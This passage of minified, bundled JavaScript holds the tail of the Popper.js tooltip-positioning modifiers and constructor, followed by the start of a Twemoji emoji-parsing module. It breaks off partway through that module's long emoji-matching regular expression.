                  a = i.reference,
                  u = r.split("-")[0],
                  s = void 0;
                return s = V(+n) ? [+n, 0] : te(n, o, a, u), "left" === u ? (o.top += s[0], o.left -= s[1]) : "right" === u ? (o.top += s[0], o.left += s[1]) : "top" === u ? (o.left += s[0], o.top -= s[1]) : "bottom" === u && (o.left += s[0], o.top += s[1]), e.popper = o, e;
              },
              offset: 0
            },
            preventOverflow: {
              order: 300,
              enabled: !0,
              fn: function (e, t) {
                var n = t.boundariesElement || p(e.instance.popper);
                e.instance.reference === n && (n = p(n));
                var r = M("transform"),
                  i = e.instance.popper.style,
                  o = i.top,
                  a = i.left,
                  u = i[r];
                i.top = "", i.left = "", i[r] = "";
                var s = k(e.instance.popper, e.instance.reference, t.padding, n, e.positionFixed);
                i.top = o, i.left = a, i[r] = u, t.boundaries = s;
                var d = t.priority,
                  l = e.offsets.popper,
                  c = {
                    primary: function (e) {
                      var n = l[e];
                      return l[e] < s[e] && !t.escapeWithReference && (n = Math.max(l[e], s[e])), x({}, e, n);
                    },
                    secondary: function (e) {
                      var n = "right" === e ? "left" : "top",
                        r = l[n];
                      return l[e] > s[e] && !t.escapeWithReference && (r = Math.min(l[n], s[e] - ("right" === e ? l.width : l.height))), x({}, n, r);
                    }
                  };
                return d.forEach(function (e) {
                  var t = -1 !== ["left", "top"].indexOf(e) ? "primary" : "secondary";
                  l = T({}, l, c[t](e));
                }), e.offsets.popper = l, e;
              },
              priority: ["left", "right", "top", "bottom"],
              padding: 5,
              boundariesElement: "scrollParent"
            },
            keepTogether: {
              order: 400,
              enabled: !0,
              fn: function (e) {
                var t = e.offsets,
                  n = t.popper,
                  r = t.reference,
                  i = e.placement.split("-")[0],
                  o = Math.floor,
                  a = -1 !== ["top", "bottom"].indexOf(i),
                  u = a ? "right" : "bottom",
                  s = a ? "left" : "top",
                  d = a ? "width" : "height";
                return n[u] < o(r[s]) && (e.offsets.popper[s] = o(r[s]) - n[d]), n[s] > o(r[u]) && (e.offsets.popper[s] = o(r[u])), e;
              }
            },
            arrow: {
              order: 500,
              enabled: !0,
              fn: function (e, t) {
                var n;
                if (!K(e.instance.modifiers, "arrow", "keepTogether")) return e;
                var r = t.element;
                if ("string" == typeof r) {
                  if (!(r = e.instance.popper.querySelector(r))) return e;
                } else if (!e.instance.popper.contains(r)) return console.warn("WARNING: `arrow.element` must be child of its popper element!"), e;
                var i = e.placement.split("-")[0],
                  o = e.offsets,
                  a = o.popper,
                  s = o.reference,
                  d = -1 !== ["left", "right"].indexOf(i),
                  l = d ? "height" : "width",
                  c = d ? "Top" : "Left",
                  f = c.toLowerCase(),
                  h = d ? "left" : "top",
                  p = d ? "bottom" : "right",
                  m = j(r)[l];
                s[p] - m < a[f] && (e.offsets.popper[f] -= a[f] - (s[p] - m)), s[f] + m > a[p] && (e.offsets.popper[f] += s[f] + m - a[p]), e.offsets.popper = C(e.offsets.popper);
                var g = s[f] + s[l] / 2 - m / 2,
                  v = u(e.instance.popper),
                  y = parseFloat(v["margin" + c]),
                  b = parseFloat(v["border" + c + "Width"]),
                  w = g - e.offsets.popper[f] - y - b;
                return w = Math.max(Math.min(a[l] - m, w), 0), e.arrowElement = r, e.offsets.arrow = (x(n = {}, f, Math.round(w)), x(n, h, ""), n), e;
              },
              element: "[x-arrow]"
            },
            flip: {
              order: 600,
              enabled: !0,
              fn: function (e, t) {
                if (B(e.instance.modifiers, "inner")) return e;
                if (e.flipped && e.placement === e.originalPlacement) return e;
                var n = k(e.instance.popper, e.instance.reference, t.padding, t.boundariesElement, e.positionFixed),
                  r = e.placement.split("-")[0],
                  i = R(r),
                  o = e.placement.split("-")[1] || "",
                  a = [];
                switch (t.behavior) {
                  case ee.FLIP:
                    a = [r, i];
                    break;
                  case ee.CLOCKWISE:
                    a = Z(r);
                    break;
                  case ee.COUNTERCLOCKWISE:
                    a = Z(r, !0);
                    break;
                  default:
                    a = t.behavior;
                }
                return a.forEach(function (u, s) {
                  if (r !== u || a.length === s + 1) return e;
                  r = e.placement.split("-")[0], i = R(r);
                  var d = e.offsets.popper,
                    l = e.offsets.reference,
                    c = Math.floor,
                    f = "left" === r && c(d.right) > c(l.left) || "right" === r && c(d.left) < c(l.right) || "top" === r && c(d.bottom) > c(l.top) || "bottom" === r && c(d.top) < c(l.bottom),
                    h = c(d.left) < c(n.left),
                    p = c(d.right) > c(n.right),
                    m = c(d.top) < c(n.top),
                    g = c(d.bottom) > c(n.bottom),
                    v = "left" === r && h || "right" === r && p || "top" === r && m || "bottom" === r && g,
                    y = -1 !== ["top", "bottom"].indexOf(r),
                    b = !!t.flipVariations && (y && "start" === o && h || y && "end" === o && p || !y && "start" === o && m || !y && "end" === o && g),
                    w = !!t.flipVariationsByContent && (y && "start" === o && p || y && "end" === o && h || !y && "start" === o && g || !y && "end" === o && m),
                    _ = b || w;
                  (f || v || _) && (e.flipped = !0, (f || v) && (r = a[s + 1]), _ && (o = function (e) {
                    return "end" === e ? "start" : "start" === e ? "end" : e;
                  }(o)), e.placement = r + (o ? "-" + o : ""), e.offsets.popper = T({}, e.offsets.popper, P(e.instance.popper, e.offsets.reference, e.placement)), e = I(e.instance.modifiers, e, "flip"));
                }), e;
              },
              behavior: "flip",
              padding: 5,
              boundariesElement: "viewport",
              flipVariations: !1,
              flipVariationsByContent: !1
            },
            inner: {
              order: 700,
              enabled: !1,
              fn: function (e) {
                var t = e.placement,
                  n = t.split("-")[0],
                  r = e.offsets,
                  i = r.popper,
                  o = r.reference,
                  a = -1 !== ["left", "right"].indexOf(n),
                  u = -1 === ["top", "left"].indexOf(n);
                return i[a ? "left" : "top"] = o[n] - (u ? i[a ? "width" : "height"] : 0), e.placement = R(t), e.offsets.popper = C(i), e;
              }
            },
            hide: {
              order: 800,
              enabled: !0,
              fn: function (e) {
                if (!K(e.instance.modifiers, "hide", "preventOverflow")) return e;
                var t = e.offsets.reference,
                  n = L(e.instance.modifiers, function (e) {
                    return "preventOverflow" === e.name;
                  }).boundaries;
                if (t.bottom < n.top || t.left > n.right || t.top > n.bottom || t.right < n.left) {
                  if (!0 === e.hide) return e;
                  e.hide = !0, e.attributes["x-out-of-boundaries"] = "";
                } else {
                  if (!1 === e.hide) return e;
                  e.hide = !1, e.attributes["x-out-of-boundaries"] = !1;
                }
                return e;
              }
            },
            computeStyle: {
              order: 850,
              enabled: !0,
              fn: function (e, t) {
                var n = t.x,
                  r = t.y,
                  i = e.offsets.popper,
                  o = L(e.instance.modifiers, function (e) {
                    return "applyStyle" === e.name;
                  }).gpuAcceleration;
                void 0 !== o && console.warn("WARNING: `gpuAcceleration` option moved to `computeStyle` modifier and will not be supported in future versions of Popper.js!");
                var a = void 0 !== o ? o : t.gpuAcceleration,
                  u = p(e.instance.popper),
                  s = S(u),
                  d = {
                    position: i.position
                  },
                  l = function (e, t) {
                    var n = e.offsets,
                      r = n.popper,
                      i = n.reference,
                      o = Math.round,
                      a = Math.floor,
                      u = function (e) {
                        return e;
                      },
                      s = o(i.width),
                      d = o(r.width),
                      l = -1 !== ["left", "right"].indexOf(e.placement),
                      c = -1 !== e.placement.indexOf("-"),
                      f = t ? l || c || s % 2 == d % 2 ? o : a : u,
                      h = t ? o : u;
                    return {
                      left: f(s % 2 == 1 && d % 2 == 1 && !c && t ? r.left - 1 : r.left),
                      top: h(r.top),
                      bottom: h(r.bottom),
                      right: f(r.right)
                    };
                  }(e, window.devicePixelRatio < 2 || !X),
                  c = "bottom" === n ? "top" : "bottom",
                  f = "right" === r ? "left" : "right",
                  h = M("transform"),
                  m = void 0,
                  g = void 0;
                if (g = "bottom" === c ? "HTML" === u.nodeName ? -u.clientHeight + l.bottom : -s.height + l.bottom : l.top, m = "right" === f ? "HTML" === u.nodeName ? -u.clientWidth + l.right : -s.width + l.right : l.left, a && h) d[h] = "translate3d(" + m + "px, " + g + "px, 0)", d[c] = 0, d[f] = 0, d.willChange = "transform";else {
                  var v = "bottom" === c ? -1 : 1,
                    y = "right" === f ? -1 : 1;
                  d[c] = g * v, d[f] = m * y, d.willChange = c + ", " + f;
                }
                var b = {
                  "x-placement": e.placement
                };
                return e.attributes = T({}, b, e.attributes), e.styles = T({}, d, e.styles), e.arrowStyles = T({}, e.offsets.arrow, e.arrowStyles), e;
              },
              gpuAcceleration: !0,
              x: "bottom",
              y: "right"
            },
            applyStyle: {
              order: 900,
              enabled: !0,
              fn: function (e) {
                var t, n;
                return Q(e.instance.popper, e.styles), t = e.instance.popper, n = e.attributes, Object.keys(n).forEach(function (e) {
                  !1 !== n[e] ? t.setAttribute(e, n[e]) : t.removeAttribute(e);
                }), e.arrowElement && Object.keys(e.arrowStyles).length && Q(e.arrowElement, e.arrowStyles), e;
              },
              onLoad: function (e, t, n, r, i) {
                var o = O(i, t, e, n.positionFixed),
                  a = N(n.placement, o, t, e, n.modifiers.flip.boundariesElement, n.modifiers.flip.padding);
                return t.setAttribute("x-placement", a), Q(t, {
                  position: n.positionFixed ? "fixed" : "absolute"
                }), n;
              },
              gpuAcceleration: void 0
            }
          },
          re = {
            placement: "bottom",
            positionFixed: !1,
            eventsEnabled: !0,
            removeOnDestroy: !1,
            onCreate: function () {},
            onUpdate: function () {},
            modifiers: ne
          },
          ie = function () {
            function e(t, n) {
              var r = this,
                i = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
              _(this, e), this.scheduleUpdate = function () {
                return requestAnimationFrame(r.update);
              }, this.update = o(this.update.bind(this)), this.options = T({}, e.Defaults, i), this.state = {
                isDestroyed: !1,
                isCreated: !1,
                scrollParents: []
              }, this.reference = t && t.jquery ? t[0] : t, this.popper = n && n.jquery ? n[0] : n, this.options.modifiers = {}, Object.keys(T({}, e.Defaults.modifiers, i.modifiers)).forEach(function (t) {
                r.options.modifiers[t] = T({}, e.Defaults.modifiers[t] || {}, i.modifiers ? i.modifiers[t] : {});
              }), this.modifiers = Object.keys(this.options.modifiers).map(function (e) {
                return T({
                  name: e
                }, r.options.modifiers[e]);
              }).sort(function (e, t) {
                return e.order - t.order;
              }), this.modifiers.forEach(function (e) {
                e.enabled && a(e.onLoad) && e.onLoad(r.reference, r.popper, r.options, e, r.state);
              }), this.update();
              var u = this.options.eventsEnabled;
              u && this.enableEventListeners(), this.state.eventsEnabled = u;
            }
            return E(e, [{
              key: "update",
              value: function () {
                return F.call(this);
              }
            }, {
              key: "destroy",
              value: function () {
                return U.call(this);
              }
            }, {
              key: "enableEventListeners",
              value: function () {
                return z.call(this);
              }
            }, {
              key: "disableEventListeners",
              value: function () {
                return Y.call(this);
              }
            }]), e;
          }();
        ie.Utils = ("undefined" != typeof window ? window : n.g).PopperUtils, ie.placements = J, ie.Defaults = re;
        const oe = ie;
      },
      5623: (e, t, n) => {
        "use strict";

        n.d(t, {
          Z: () => r
        });
        const r = function () {
          var e = {
              base: "https://twemoji.maxcdn.com/v/14.0.2/",
              ext: ".png",
              size: "72x72",
              className: "emoji",
              convert: {
                fromCodePoint: function (e) {
                  var t = "string" == typeof e ? parseInt(e, 16) : e;
                  if (t < 65536) return u(t);
                  return u(55296 + ((t -= 65536) >> 10), 56320 + (1023 & t));
                },
                toCodePoint: v
              },
              onerror: function () {
                this.parentNode && this.parentNode.replaceChild(s(this.alt, !1), this);
              },
              parse: function (t, n) {
                n && "function" != typeof n || (n = {
                  callback: n
                });
                return ("string" == typeof t ? h : f)(t, {
                  callback: n.callback || d,
                  attributes: "function" == typeof n.attributes ? n.attributes : m,
                  base: "string" == typeof n.base ? n.base : e.base,
                  ext: n.ext || e.ext,
                  size: n.folder || (r = n.size || e.size, "number" == typeof r ? r + "x" + r : r),
                  className: n.className || e.className,
                  onerror: n.onerror || e.onerror
                });
                var r;
              },
              replace: g,
              test: function (e) {
                n.lastIndex = 0;
                var t = n.test(e);
                return n.lastIndex = 0, t;
              }
            },
            t = {
              "&": "&amp;",
              "<": "&lt;",
              ">": "&gt;",
              "'": "&#39;",
              '"': "&quot;"
            },
            n = /(?:\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d[\udc68\udc69]|\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c[\udffc-\udfff]|\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c[\udffb\udffd-\udfff]|\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c[\udffb-\udffd\udfff]|\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c[\udffb-\udffe]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d[\udc68\udc69]|\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1|\ud83d\udc6b\ud83c[\udffb-\udfff]|\ud83d\udc6c\ud83c[\udffb-\udfff]|\ud83d\udc6d\ud83c[\udffb-\udfff]|\ud83d\udc8f\ud83c[\udffb-\udfff]|\ud83d\udc91\ud83c[\udffb-\udfff]|\ud83e\udd1d\ud83c[\udffb-\udfff]|\ud83d[\udc6b-\udc6d\udc8f\udc91]|\ud83e\udd1d)|(?:\ud83d[\udc68\udc69]|\ud83e\uddd1)(?:\ud83c[\udffb-\udfff])?\u200d(?:\u2695\ufe0f|\u2696\ufe0f|\u2708\ufe0f|\ud83c[\udf3e\udf73\udf7c\udf84\udf93\udfa4\udfa8\udfeb\udfed]|\ud83d[\udcbb\udcbc\udd27\udd2c\ude80\ude92]|\ud83e[\uddaf-\uddb3\uddbc\uddbd])|(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75]|\u26f9)((?:\ud83c[\udffb-\udfff]|\ufe0f)\u200d[\u2640\u2642]\ufe0f)|(?:\ud83c[\udfc3\udfc4\udfca]|\ud83d[\udc6e\udc70\udc71\udc73\udc77\udc81\udc82\udc86\udc87\ude45-\ude47\ude4b\ude4d\ude4e\udea3\udeb4-\udeb6]|\ud83e[\udd26\udd35\udd37-\udd39\udd3d\udd3e\uddb8\uddb9\uddcd-\uddcf\uddd4\uddd6-\udddd])(?:\ud83c[\udffb-\udfff])?\u200d[\u2640\u2642]\ufe0f|(?:\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f|\ud83c\udff3\ufe0f\u200d\ud83c\udf08|\ud83d\ude36\u200d\ud83c\udf2b\ufe0f|\u2764\ufe0f\u200d\ud83d\udd25|\u2764\ufe0f\u200d\ud83e\ude79|\ud83c\udff4\u200d\u2620\ufe0f|\ud83d\udc15\u200d\ud83e\uddba|\ud83d\udc3b\u200d\u2744\ufe0f|\ud83d\udc41\u200d\ud83d\udde8|\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc6f\u200d\u2640\ufe0f|\ud83d\udc6f\u200d\u2642\ufe0f|\ud83d\ude2e\u200d\ud83d\udca8|\ud83d\ude35\u200d\ud83d\udcab|\ud83e\udd3c\u200d\u2640\ufe0f|\ud83e\udd3c\u200d\u2642\ufe0f|\ud83e\uddde\u200d\u2640\ufe0f|\ud83e\uddde\u200d\u2642\ufe0f|\ud83e\udddf\u200d\u2640\ufe0f|\ud83e\udddf\u200d\u2642\ufe0f|\ud83d\udc08\u200d\u2b1b)|[#*0-9]\ufe0f?\u20e3|(?:[©®\u2122\u265f]\ufe0f)|(?:\ud83c[\udc04\udd70\udd71\udd7e\udd7f\ude02\ude1a\ude2f\ude37\udf21\udf24-\udf2c\udf36\udf7d\udf96\udf97\udf99-\udf9b\udf9e\udf9f\udfcd\udfce\udfd4-\udfdf\udff3\udff5\udff7]|\ud83d[\udc3f\udc41\udcfd\udd49\udd4a\udd6f\udd70\udd73\udd76-\udd79\udd87\udd8a-\udd8d\udda5\udda8\uddb1\uddb2\uddbc\uddc2-\uddc4\uddd1-\uddd3\udddc-\uddde\udde1\udde3\udde8\uddef\uddf3\uddfa\udecb\udecd-\udecf\udee0-\udee5\udee9\udef0\udef3]|[\u203c\u2049\u2139\u2194-\u2199\u21a9\u21aa\u231a\u231b\u2328\u23cf\u23ed-\u23ef\u23f1\u23f2\u23f8-\u23fa\u24c2\u25aa\u25ab\u25b6\u25c0\u25fb-\u25fe\u2600-\u2604\u260e\u2611\u2614\u2615\u2618\u2620\u2622\u2623\u2626\u262a\u262e\u262f\u2638-\u263a\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267b\u267f\u2692-\u2697\u2699\u269b\u269c\u26a0\u26a1\u26a7\u26aa\u26ab\u26b0\u26b1\u26bd\u26be\u26c4\u26c5\u26c8\u26cf\u26d1\u26d3\u26d4\u26e9\u26ea\u26f0-\u26f5\u26f8\u26fa\u26fd\u2702\u2708\u2709\u270f\u2712\u2714\u2716\u271d\u2721\u2733\u2734\u2744\u2747\u2757\u2763\u2764\u27a1\u2934\u2935\u2b05-\u2b07\u2b1b\u2b1c\u2b50\u2b55\u3030\u303d\u3297\u3299])(?:\ufe0f|(?!\ufe0e))|(?:(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75\udd90]|[\u261d\u26f7\u26f9\u270c\u270d])(?:\ufe0f|(?!\ufe0e))|(?:\ud83c[\udf85\udfc2-\udfc4\udfc7\udfca]|\ud83d[\udc42\udc43\udc46-\udc50\udc66-\udc69\udc6e\udc70-\udc78\udc7c\udc81-\udc83\udc85-\udc87\udcaa\udd7a\udd95\udd96\ude45-\ude47\ude4b-\ude4f\udea3\udeb4-\udeb6\udec0\udecc]|\ud83e[\udd0c\udd0f\udd18-\udd1c\udd1e\udd1f\udd26\udd30-\udd39\udd3d\udd3e\udd77\uddb5\uddb6\uddb8\uddb9\uddbb\uddcd-\uddcf\uddd1-\udddd\udec3-\udec5\udef0-\udef6]|[\u270a\u270b]))(?:\ud83c[\udffb-\udfff])?|(?:\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f|\ud83c\udde6\ud83c[\udde8-\uddec\uddee\uddf1\uddf2\uddf4\uddf6-\uddfa\uddfc\uddfd\uddff]|\ud83c\udde7\ud83c[\udde6\udde7\udde9-\uddef\uddf1-\uddf4\uddf6-\uddf9\uddfb\uddfc\uddfe\uddff]|\ud83c\udde8\ud83c[\udde6\udde8\udde9\uddeb-\uddee\uddf0-\uddf5\uddf7\uddfa-\uddff]|\ud83c\udde9\ud83c[\uddea\uddec\uddef\uddf0\uddf2\uddf4\uddff]|\ud83c\uddea\ud83c[\udde6\udde8\uddea\uddec\udded\uddf7-\uddfa]|\ud83c\uddeb\ud83c[\uddee-\uddf0\uddf2\uddf4\uddf7]|\ud83c\uddec\ud83c[\udde6\udde7\udde9-\uddee\uddf1-\uddf3\uddf5-\uddfa\uddfc\uddfe]|\ud83c\udded\ud83c[\uddf0\uddf2\uddf3\uddf7\uddf9\uddfa]|\ud83c\uddee\ud83c[\udde8-\uddea\uddf1-\uddf4\uddf6-\uddf9]|\ud83c\uddef\ud83c[\uddea\uddf2\uddf4\uddf5]|\ud83c\uddf0\ud83c[\uddea\uddec-\uddee\uddf2\uddf3\uddf5\uddf7\uddfc\uddfe\uddff]|\ud83c\uddf1\ud83c[\udde6-\udde8\uddee\uddf0\uddf7-\uddfb\uddfe]|\ud83c\uddf2\ud83c[\udde6\udde8-\udded\uddf0-\uddff]|\ud83c\uddf3\ud83c[\udde6\udde8\uddea-\uddec\uddee\uddf1\uddf4\uddf5\uddf7\uddfa\uddff]|\ud83c\uddf4\ud83c\uddf2|\ud83c\uddf5\ud83c[\udde6\uddea-\udded\uddf0-\uddf3\uddf7-\uddf9\uddfc\uddfe]|\ud83c\uddf6\ud83c\udde6|\ud83c\uddf7\ud83c[\uddea\uddf4\uddf8\uddfa\uddfc]|\ud83c\uddf8\ud83c[\udde6-\uddea\uddec-\uddf4\uddf7-\uddf9\uddfb\uddfd-\uddff]|\ud83c\uddf9\ud83c[\udde6\udde8\udde9\uddeb-\udded\uddef-\uddf4\uddf7\uddf9\uddfb\uddfc\uddf